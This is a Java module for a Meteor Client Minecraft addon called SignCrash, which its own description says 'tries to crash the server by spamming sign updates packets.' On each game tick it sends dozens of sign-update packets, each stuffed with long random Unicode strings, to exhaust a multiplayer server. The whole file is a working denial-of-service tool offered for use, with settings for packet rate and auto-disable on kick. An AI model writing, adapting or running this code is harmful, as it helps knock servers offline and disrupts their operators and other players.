package WideCat.MeteorCrashAddon.modules;

import WideCat.MeteorCrashAddon.MeteorCrashAddon;
import meteordevelopment.orbit.EventHandler;
import minegame159.meteorclient.events.game.GameLeftEvent;
import minegame159.meteorclient.events.world.TickEvent;
import minegame159.meteorclient.systems.modules.Module;
import minegame159.meteorclient.settings.BoolSetting;
import minegame159.meteorclient.settings.IntSetting;
import minegame159.meteorclient.settings.Setting;
import minegame159.meteorclient.settings.SettingGroup;
import net.minecraft.network.packet.c2s.play.UpdateSignC2SPacket;

import java.util.Objects;
import java.util.Random;

public class SignCrash extends Module {
    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    private final Setting<Integer> packets = sgGeneral.add(new IntSetting.Builder()
            .name("packets")
            .description("How many packets to send per tick")
            .defaultValue(38)
            .min(1)
            .sliderMax(100)
            .build()
    );

    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
            .name("auto-disable")
            .description("Disables module on kick.")
            .defaultValue(false)
            .build()
    );

    public SignCrash() {
        super(MeteorCrashAddon.CATEGORY, "sign-crash", "Tries to crash the server by spamming sign updates packets.");
    }

    @EventHandler
    private void onTick(TickEvent.Post event) {
        for (int i = 0; i < packets.get(); i++) {
            assert mc.player != null;
            UpdateSignC2SPacket packet = new UpdateSignC2SPacket(mc.player.getBlockPos(), rndBinStr(598), rndBinStr(598),
                    rndBinStr(598), rndBinStr(598));
            Objects.requireNonNull(mc.getNetworkHandler()).sendPacket(packet);
        }
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (!autoDisable.get()) return;

        toggle();
    }

    public static String rndBinStr(int size) {
        StringBuilder end = new StringBuilder();
        for (int i = 0; i < size; i++) {
            // 65+57
            end.append((char) (new Random().nextInt(0xFFFF)));
        }
        return end.toString();
    }
}
